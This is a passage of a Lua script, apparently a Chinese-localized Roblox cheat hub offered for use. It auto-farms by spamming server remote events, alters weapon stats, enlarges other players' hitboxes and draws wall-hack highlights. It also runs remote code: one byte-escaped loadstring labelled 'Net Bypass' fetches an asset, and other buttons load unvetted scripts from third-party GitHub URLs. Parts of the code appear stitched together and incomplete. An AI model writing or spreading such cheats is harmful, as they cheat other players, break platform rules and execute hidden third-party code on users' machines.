Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3)
end
end)

AutoRebirth.Name = "繁星中心"
AutoRebirth.Parent = Main
AutoRebirth.BackgroundColor3 = Color3.new(0, 0, 0)
AutoRebirth.Position = UDim2.new(0.225957587, 0, 0.586643875, 0)
AutoRebirth.Size = UDim2.new(0, 200, 0, 50)
AutoRebirth.Font = Enum.Font.GothamSemibold
AutoRebirth.Text = "繁星刷级"
AutoRebirth.TextColor3 = Color3.new(1, 1, 1)
AutoRebirth.TextScaled = true
AutoRebirth.TextSize = 24
AutoRebirth.TextWrapped = true
AutoRebirth.MouseButton1Down:connect(function()
while wait(0.1) do 
local A_1 = "rebirthRequest"
local Event = game:GetService("ReplicatedStorage").rEvents.rebirthEvent
Event:FireServer(A_1)
end
end)

Credits.Name = "Credits"
Credits.Parent = Main
Credits.BackgroundColor3 = Color3.new(0, 0, 0)
Credits.Size = UDim2.new(0, 395, 0, 37)
Credits.Font = Enum.Font.GothamSemibold
Credits.Text = "繁星"
Credits.TextColor3 = Color3.new(1, 1, 1)
Credits.TextScaled = true
Credits.TextSize = 14
Credits.TextWrapped = true

Game.Name = "Game"
Game.Parent = Main
Game.BackgroundColor3 = Color3.new(0, 0, 0)
Game.Position = UDim2.new(0, 0, 0.863468647, 0)
Game.Size = UDim2.new(0, 395, 0, 37)
Game.Font = Enum.Font.GothamSemibold
Game.Text = "Legends Of Speed Hack Script"
Game.TextColor3 = Color3.new(1, 1, 1)
Game.TextScaled = true
Game.TextSize = 14
Game.TextWrapped = true
-- Scripts:
end)

local creds = window:Tab("兵工厂/范围）",'6035145364')

local tool = creds:section("功能",true)
tool:Button("（快捷）",function()
        	-- Template is made by $Krew AKA @e.#3642
-- join my discord: https://discord.gg/JPTv7JkG8g
-- dont change the above!!

local KrewTemplate = Instance.new("ScreenGui")
local KrewTempOpen = Instance.new("Frame")
local Name = Instance.new("TextLabel")
local Line = Instance.new("TextLabel")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UICorner = Instance.new("UICorner")
local Function1 = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local Function2 = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Function3 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local Function4 = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local Function5 = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local Function6 = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local Function7 = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local Function8 = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local Function9 = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local Function10 = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local CredsDontRemove = Instance.new("TextLabel")
local Close = Instance.new("TextButton")
local TempByKrew = Instance.new("Frame")
local TextButton = Instance.new("TextButton")

KrewTemplate.Name = "$KrewTemplate"
KrewTemplate.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
KrewTemplate.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

KrewTempOpen.Name = "$KrewTempOpen"
KrewTempOpen.Parent = KrewTemplate
KrewTempOpen.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
KrewTempOpen.BorderColor3 = Color3.fromRGB(60, 60, 60)
KrewTempOpen.Position = UDim2.new(0.248681813, 0, 0.245463297, 0)
KrewTempOpen.Size = UDim2.new(0.533831894, 0, 0.506991863, 0)

Name.Name = "Name"
Name.Parent = KrewTempOpen
Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Name.BackgroundTransparency = 1.000
Name.Size = UDim2.new(0.245568082, 0, 0.0833867863, 0)
Name.Font = Enum.Font.SourceSans
Name.Text = "👉兵工厂👌" -- put the gui name here
Name.TextColor3 = Color3.fromRGB(255, 255, 255)
Name.TextSize = 16.000

Line.Name = "Line"
Line.Parent = KrewTempOpen
Line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Line.BackgroundTransparency = 1.000
Line.Position = UDim2.new(0.0978987217, 0, 0.0416933969, 0)
Line.Size = UDim2.new(0.0476846658, 0, 0.0833867863, 0)
Line.Font = Enum.Font.SourceSans
Line.Text = "”””””””””””" -- change if u dont want questionmarks
Line.TextColor3 = Color3.fromRGB(30, 30, 30)
Line.TextSize = 14.000

ScrollingFrame.Parent = KrewTempOpen
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
ScrollingFrame.BackgroundTransparency = 0.900
ScrollingFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)
ScrollingFrame.Position = UDim2.new(0.0450695045, 0, 0.253367454, 0)
ScrollingFrame.Size = UDim2.new(0.928037941, 0, 0.683130264, 0)

UICorner.Parent = ScrollingFrame

Function1.Name = "Function1"
Function1.Parent = ScrollingFrame
Function1.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function1.Position = UDim2.new(0.0397513807, 0, 0.0140820052, 0)
Function1.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function1.Font = Enum.Font.SourceSans
Function1.Text = "枪" -- function one (attack and shit)
Function1.TextColor3 = Color3.fromRGB(0, 0, 0)
Function1.TextSize = 14.000
Function1.MouseButton1Down:Connect(function()
  local replicationstorage = game.ReplicatedStorage

for i, v in pairs(replicationstorage.Weapons:GetDescendants()) do
   if v.Name == "Auto" then
       v.Value = true
   end
   if v.Name == "RecoilControl" then
       v.Value = 0
   end
   if v.Name == "MaxSpread" then
       v.Value = 0
   end
   if v.Name == "ReloadTime" then
      v.Value = 1
   end
   if v.Name == "FireRate" then
       v.Value = 0.05
   end
   if v.Name == "Crit" then
       v.Value = 20
   end
end
end)

UICorner_2.Parent = Function1

Function2.Name = "Function2"
Function2.Parent = ScrollingFrame
Function2.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function2.Position = UDim2.new(0.0397513807, 0, 0.103883162, 0)
Function2.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function2.Font = Enum.Font.SourceSans
Function2.Text = "彩虹枪皮肤" -- function 2 (attack and shit)
Function2.TextColor3 = Color3.fromRGB(0, 0, 0)
Function2.TextSize = 14.000
Function2.MouseButton1Down:Connect(function()
  local c = 1 function zigzag(X)  return math.acos(math.cos(X * math.pi)) / math.pi end game:GetService("RunService").RenderStepped:Connect(function()  if game.Workspace.Camera:FindFirstChild('Arms') then   for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    if v.ClassName == 'MeshPart' then      v.Color = Color3.fromHSV(zigzag(c),1,1)     c = c + .0001    end   end  end end)
end)

UICorner_3.Parent = Function2

Function3.Name = "Function3"
Function3.Parent = ScrollingFrame
Function3.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function3.Position = UDim2.new(0.0397513807, 0, 0.195287913, 0)
Function3.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function3.Font = Enum.Font.SourceSans
Function3.Text = "瞄准" -- function 3 (attack and shit)
Function3.TextColor3 = Color3.fromRGB(0, 0, 0)
Function3.TextSize = 14.000
Function3.MouseButton1Down:Connect(function()
  function getplrsname()
for i,v in pairs(game:GetChildren()) do
if v.ClassName == "Players" then
return v.Name
end
end
end
local players = getplrsname()
local plr = game[players].LocalPlayer
coroutine.resume(coroutine.create(function()
while wait(1) do
coroutine.resume(coroutine.create(function()
for _,v in pairs(game[players]:GetPlayers()) do
if v.Name ~= plr.Name and v.Character then
v.Character.HeadHB.CanCollide = false
v.Character.HeadHB.Transparency = 10
v.Character.HeadHB.Size = Vector3.new(100,100,100)
v.Character.HumanoidRootPart.CanCollide = false
v.Character.HumanoidRootPart.Transparency = 10
v.Character.HumanoidRootPart.Size = Vector3.new(100,100,100)
end
end
end))
end
end))
function CreateSG(name,parent,face)
local SurfaceGui = Instance.new("SurfaceGui",parent)
SurfaceGui.Parent = parent
SurfaceGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
SurfaceGui.Face = Enum.NormalId[face]
SurfaceGui.LightInfluence = 0
SurfaceGui.ResetOnSpawn = false
SurfaceGui.Name = name
SurfaceGui.AlwaysOnTop = true
local Frame = Instance.new("Frame",SurfaceGui)
Frame.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
Frame.Size = UDim2.new(1,0,1,0)
end
while wait(1) do
for i,v in pairs (game:GetService("Players"):GetPlayers()) do
if v ~= game:GetService("Players").LocalPlayer and v.Character ~= nil and
v.Character:FindFirstChild("LowerTorso") and v.Character.LowerTorso:FindFirstChild("cham") == nil then
for i,v in pairs (v.Character:GetChildren()) do
if v:IsA("MeshPart") or v.Name == "LowerTorso" then
CreateSG("cham",v,"Back")
CreateSG("cham",v,"Front")
CreateSG("cham",v,"Left")
CreateSG("cham",v,"Right")
CreateSG("cham",v,"Right")
CreateSG("cham",v,"Top")
CreateSG("cham",v,"Bottom")
end
end
end
end
end
end)

UICorner_4.Parent = Function3

Function4.Name = "Function4"
Function4.Parent = ScrollingFrame
Function4.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function4.Position = UDim2.new(0.0397513807, 0, 0.283485472, 0)
Function4.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function4.Font = Enum.Font.SourceSans
Function4.Text = "速度" -- function 4 (attack and shit)
Function4.TextColor3 = Color3.fromRGB(0, 0, 0)
Function4.TextSize = 14.000
Function4.MouseButton1Down:Connect(function()
  net = true -- if false = do nothing
notify = true -- set this to false if u don't want to see notiflication


loadstring("\13\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\71\101\116\79\98\106\101\99\116\115\40\34\114\98\120\97\115\115\101\116\105\100\58\47\47\55\50\53\55\55\54\49\55\56\53\34\41\91\49\93\46\83\111\117\114\99\101\41\40\41\13\10")()

wait(0)
game.StarterGui:SetCore("SendNotification", {
Title = "âœ…!";
Text = "Net Bypass Activated.";
})
end)

UICorner_11.Parent = Function10

CredsDontRemove.Name = "CredsDontRemove" --dont remove or change the credits from the template
CredsDontRemove.Parent = KrewTempOpen
CredsDontRemove.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CredsDontRemove.BackgroundTransparency = 1.000
CredsDontRemove.Position = UDim2.new(0.311960489, 0, 0.16607289, 0)
CredsDontRemove.Size = UDim2.new(0.392178982, 0, 0.0609364994, 0)
CredsDontRemove.Font = Enum.Font.SourceSans
CredsDontRemove.Text = "繁星汉化 " --dont change this (leave my credits)
CredsDontRemove.TextColor3 = Color3.fromRGB(120, 120, 120)
CredsDontRemove.TextSize = 14.000

Close.Name = "Close"
Close.Parent = KrewTempOpen
Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Close.BackgroundTransparency = 1.000
Close.Position = UDim2.new(0.909142137, 0, 0.00320718414, 0)
Close.Size = UDim2.new(0.0908579305, 0, 0.0801796019, 0)
Close.Font = Enum.Font.SourceSans
Close.Text = "X" -- change if u dont want questionmarks
Close.TextColor3 = Color3.fromRGB(255, 255, 255)
Close.TextSize = 14.000

TempByKrew.Name = "TempBy$Krew"
TempByKrew.Parent = KrewTemplate
TempByKrew.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TempByKrew.Position = UDim2.new(0.567761779, 0, 0.979447246, 0)
TempByKrew.Size = UDim2.new(0.214157432, 0, 0.0168804135, 0)
TempByKrew.Visible = false

TextButton.Parent = TempByKrew
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.Size = UDim2.new(0.935741007, 0, 0.96325624, 0)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "    â–º" -- change if u dont want questionmarks
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 14.000
TextButton.TextXAlignment = Enum.TextXAlignment.Left

-- Scripts (dont touch):

local function EEYCAWA_fake_script() -- Close.Script 
	local script = Instance.new('Script', Close)

	local frame = script.Parent.Parent.Parent["$KrewTempOpen"]
	
	
	
	script.Parent.MouseButton1Click:Connect(function()
		if frame.Visible == true then
			frame.Visible = false
			frame.Parent["TempBy$Krew"].Visible = true
		end
	end)
end
coroutine.wrap(EEYCAWA_fake_script)()
local function VLRJSU_fake_script() -- KrewTempOpen.LocalScript 
	local script = Instance.new('LocalScript', KrewTempOpen)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
end

game.StarterGui:SetCore("SendNotification",  {
 Title = "Script is made by G.A.X.P";
 Text = "discord.gg/JPTv7JkG8g";
 Icon = ""; -- dont touch this, if u want to add ur own notification just do this:
 Duration = 5;
})

coroutine.wrap(VLRJSU_fake_script)()
local function RKEF_fake_script() -- TextButton.Script 
	local script = Instance.new('Script', TextButton)

	local frame = script.Parent.Parent.Parent["$KrewTempOpen"]
	
	script.Parent.MouseButton1Click:Connect(function()
		if frame.Visible == false then
			frame.Visible = true
			script.Parent.Parent.Parent["TempBy$Krew"].Visible = false
		end
	end)
end
coroutine.wrap(RKEF_fake_script)()
local function XSRGC_fake_script() -- TempByKrew.LocalScript 
	local script = Instance.new('LocalScript', TempByKrew)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
end
coroutine.wrap(XSRGC_fake_script)()
end)
local tool = creds:section("范围",true)
tool:Button("（13）",function()
        	_G.HeadSize = 13
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)
end)

tool:Button("（20）",function()
        	_G.HeadSize = 20
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)
end)
tool:Button("（关闭）",function()
        	_G.HeadSize = 5
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)
end)
local creds = window:Tab("凹凸世界自由丛林）",'6035145364')

local tool = creds:section("功能",true)
tool:Button("（自动裁判球）",function()
        	loadstring(game:HttpGet("https://raw.githubusercontent.com/KissxTay/caramelldansen/main/chinese%20event", true))()
end)
local creds = window:Tab("举重模拟器）",'6035145364')

local tool = creds:section("功能",true)
tool:Button("（快捷）",function()
        	local UILibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/twink"))()

local MainUI = UILibrary.Load("繁星举重模拟器")
local FirstPage = MainUI.AddPage("首页")

FirstPage.AddToggle("自动举重", false, function(Value)
toggle = Value
while toggle do wait()
local ohTable1 = {
	[1] = "GainMuscle"
}
game:GetService("ReplicatedStorage").RemoteEvent:FireServer(ohTable1)
    end
end)
FirstPage.AddToggle("自动售卖", false, function(Value)
    tog = Value
   while tog do wait()
local ohTable1 = {
	[1] = "SellMuscle"
}

game:GetService("ReplicatedStorage").RemoteEvent:FireServer(ohTable1)
    end
end)
FirstPage.AddButton("显示商店界面", function()
    game:GetService("Players").LocalPlayer.PlayerGui["Main_Gui"]["UpgradeMenu_Frame"].Visible = true
end)
end)
local creds = window:Tab("蜂群模拟器）",'6035145364')

local tool = creds:section("功能",true)
tool:Button("＜蜂群模拟器点击一键开始>",function()
        --Edited by BeeswarmMVP sub to my yt

for _,v in pairs(game.workspace.Collectibles:GetChildren()) do

if string.find(v.Name,"") then
v:Destroy()
end
end
 
local tuoidz = "Sunflower Field"
local DarkCyberMainGUI = Instance.new("ScreenGui")
local MiniPage = Instance.new("Frame")
local Destroy = Instance.new("TextButton")
local GameText = Instance.new("TextLabel")
local MainPage = Instance.new("Frame")
local VersionText = Instance.new("TextLabel")
local HomePage = Instance.new("Frame")
local ImageGang = Instance.new("ImageLabel")
local CreditText = Instance.new("TextLabel")
local JoinText = Instance.new("TextLabel")
local DiscordlinkTest = Instance.new("TextLabel")
local Copylinkdiscord = Instance.new("TextButton")
local FarmingPage = Instance.new("Frame")
local FieldSelectPage = Instance.new("ScrollingFrame")
local SunflowerButton = Instance.new("TextButton")
local MushroomButton = Instance.new("TextButton")
local SpiderButton = Instance.new("TextButton")
local BambooButton = Instance.new("TextButton")
local RoseButton = Instance.new("TextButton")
local PineTreeButton = Instance.new("TextButton")
local CactusButton = Instance.new("TextButton")
local PumpkinButton = Instance.new("TextButton")
local PineappleButton = Instance.new("TextButton")
local StumpButton = Instance.new("TextButton")
local MountainTopButton = Instance.new("TextButton")
local CoconutButton = Instance.new("TextButton")
local PepperButton = Instance.new("TextButton")
local StawberryButton = Instance.new("TextButton")
local BlueflowerButton = Instance.new("TextButton")
local DanrButton = Instance.new("TextButton")
local DanrButton_2 = Instance.new("TextButton")
local FieldSelectText = Instance.new("TextLabel")
local HoneyText = Instance.new("TextLabel")
local FieldText = Instance.new("TextLabel")
local TimeElapsedText = Instance.new("TextLabel")
local StartButton = Instance.new("TextButton")
local FieldSelectText_2 = Instance.new("TextLabel")
local WaypointPage = Instance.new("ScrollingFrame")
local Suntp = Instance.new("TextButton")
local Mushtp = Instance.new("TextButton")
local Dantp = Instance.new("TextButton")
local Blueftp = Instance.new("TextButton")
local Clovertp = Instance.new("TextButton")
local Bambootp = Instance.new("TextButton")
local Spidertp = Instance.new("TextButton")
local Strawtp = Instance.new("TextButton")
local Castustp = Instance.new("TextButton")
local Pumtp = Instance.new("TextButton")
local Pintreetp = Instance.new("TextButton")
local Rosetp = Instance.new("TextButton")
local Toptp = Instance.new("TextButton")
local Coconuttp = Instance.new("TextButton")
local Stumptp = Instance.new("TextButton")
local Pineappletp = Instance.new("TextButton")
local Peppertp = Instance.new("TextButton")
local SummonSprouttp = Instance.new("TextButton")
local Coconutshoptp = Instance.new("TextButton")
local Petaltp = Instance.new("TextButton")
local Shopproctp = Instance.new("TextButton")
local Shoptoptp = Instance.new("TextButton")
local Shopmoontp = Instance.new("TextButton")
local Shopbasictp = Instance.new("TextButton")
local Shopsprinklertp = Instance.new("TextButton")
local InstantConversiontp = Instance.new("TextButton")
local MegaMemorytp = Instance.new("TextButton")
local NightMemorytp = Instance.new("TextButton")
local ExtremeMemorytp = Instance.new("TextButton")
local StartHalltp = Instance.new("TextButton")
local Anttp = Instance.new("TextButton")
local Demonmasktp = Instance.new("TextButton")
local TunelBeartp = Instance.new("TextButton")
local WindyBeetp = Instance.new("TextButton")
local Diamondmasktp = Instance.new("TextButton")
local Soon = Instance.new("TextButton")
local GummyMask = Instance.new("TextButton")
local Afkstumptp = Instance.new("TextButton")
local Stinger = Instance.new("TextButton")
local Kingamulettp = Instance.new("TextButton")
local ExtraPage = Instance.new("ScrollingFrame")
local Autodig = Instance.new("TextButton")
local Autobuffitem = Instance.new("TextButton")
local Killcoconutcrab = Instance.new("TextButton")
local KillTunnel = Instance.new("TextButton")
local Usenightbell = Instance.new("TextButton")
local Usefielddice = Instance.new("TextButton")
local Autokillvicious = Instance.new("TextButton")
local Autokillwindy = Instance.new("TextButton")
local Autokillmonster = Instance.new("TextButton")
local RemoteQuest = Instance.new("TextButton")
local Autogumdrop = Instance.new("TextButton")
local FindWindBee = Instance.new("TextButton")
local Useglitter = Instance.new("TextButton")
local Autogliter = Instance.new("TextButton")
local Autococonut = Instance.new("TextButton")
local Autostinger = Instance.new("TextButton")
local Eqipdemonmask = Instance.new("TextButton")
local Equipdemonmask = Instance.new("TextButton")
local Equipgummymask = Instance.new("TextButton")
local Automagicbean = Instance.new("TextButton")
local Bringtornado = Instance.new("TextButton")
local Killstumnail = Instance.new("TextButton")
local Dropweapon = Instance.new("TextButton")
local Noclip = Instance.new("TextButton")
local AutoDispenser = Instance.new("TextButton")
local Autotop = Instance.new("TextButton")
local AutoDispenser_2 = Instance.new("TextButton")
local Autored = Instance.new("TextButton")
local Autoblue = Instance.new("TextButton")
local ExtrasButton = Instance.new("TextButton")
local FarmingButton = Instance.new("TextButton")
local HomeButton = Instance.new("TextButton")
local SettingButton = Instance.new("TextButton")
local WaypointsButton = Instance.new("TextButton")
local SettingPage = Instance.new("Frame")
local Antiafk = Instance.new("TextLabel")
local Antiafkbutton = Instance.new("TextButton")
local Close = Instance.new("TextButton")
local DarkCyberLoadingGUI = Instance.new("ScreenGui")
local LoadingFrame = Instance.new("Frame")
local Loadingimage = Instance.new("ImageLabel")
local Createtitle = Instance.new("TextLabel")
local NameTitle = Instance.new("TextLabel")
local Loadingtext = Instance.new("TextLabel")
local DarkCyberSynapshitGUI = Instance.new("ScreenGui")
local SynapShitPage = Instance.new("Frame")
local Createtitle = Instance.new("TextLabel")
local NameTitle = Instance.new("TextLabel")
local Welcome = Instance.new("TextLabel")
 
--Properties:
DarkCyberMainGUI.Name = "[DarkCyber]主界面"
DarkCyberMainGUI.Parent = game.CoreGui
 
MiniPage.Name = "迷你页"
MiniPage.Parent = DarkCyberMainGUI
MiniPage.BackgroundColor3 = Color3.new(0.321569, 0.462745, 1)
MiniPage.BorderSizePixel = 0
MiniPage.Position = UDim2.new(0.361979187, 0, -0.7, 0)
MiniPage.Size = UDim2.new(0, 530, 0, 25)
 
Destroy.Name = "摧毁"
Destroy.Parent = MiniPage
Destroy.BackgroundColor3 = Color3.new(1, 1, 1)
Destroy.BackgroundTransparency = 1
Destroy.Position = UDim2.new(0.950854659, 0, 0, 0)
Destroy.Size = UDim2.new(0, 25, 0, 25)
Destroy.Font = Enum.Font.GothamBold
Destroy.Text = "X"
Destroy.TextColor3 = Color3.new(1, 1, 1)
Destroy.TextSize = 20
 
GameText.Name = "游戏文本"
GameText.Parent = MiniPage
GameText.BackgroundColor3 = Color3.new(1, 1, 1)
GameText.BackgroundTransparency = 1
GameText.Position = UDim2.new(0.337588102, 0, -0.0399999991, 0)
GameText.Size = UDim2.new(0.324587107, 0, 0.999999702, 0)
GameText.Font = Enum.Font.GothamBold
GameText.Text = "蜂群模拟器"
GameText.TextColor3 = Color3.new(1, 1, 1)
GameText.TextSize = 16
 
MainPage.Name = "主页面"
MainPage.Parent = MiniPage
MainPage.Active = true
MainPage.BackgroundColor3 = Color3.new(0.321569, 0.462745, 1)
MainPage.BorderSizePixel = 0
MainPage.Position = UDim2.new(0, 0, 1.0016675, 0)
MainPage.Selectable = true
MainPage.Size = UDim2.new(1, 0, 8.9163208, 0)
 
VersionText.Name = "版本文本"
VersionText.Parent = MainPage
VersionText.BackgroundColor3 = Color3.new(1, 1, 1)
VersionText.BackgroundTransparency = 1
VersionText.Position = UDim2.new(-0.00158959627, 0, 0.914668798, 0)
VersionText.Size = UDim2.new(0.213481352, 0, 0.08324752, 0)
VersionText.Font = Enum.Font.GothamBold
VersionText.Text = "版本: 1.0.0"
VersionText.TextColor3 = Color3.new(1, 1, 1)
VersionText.TextSize = 16
 
HomePage.Name = "主页"
HomePage.Parent = MainPage
HomePage.BackgroundColor3 = Color3.new(1, 1, 1)
HomePage.BackgroundTransparency = 1
HomePage.BorderSizePixel = 0
HomePage.Position = UDim2.new(0, 0, 0.132234111, 0)
HomePage.Size = UDim2.new(1, 0, 0.782434821, 0)
 
ImageGang.Name = "ImageGang公司"
ImageGang.Parent = HomePage
ImageGang.BackgroundColor3 = Color3.new(1, 1, 1)
ImageGang.Position = UDim2.new(0.0295857992, 0, 0.0601093024, 0)
ImageGang.Size = UDim2.new(0, 70, 0, 70)
ImageGang.Image = "http://www.roblox.com/asset/?id=3766691866"
 
CreditText.Name = "创建文本"
CreditText.Parent = HomePage
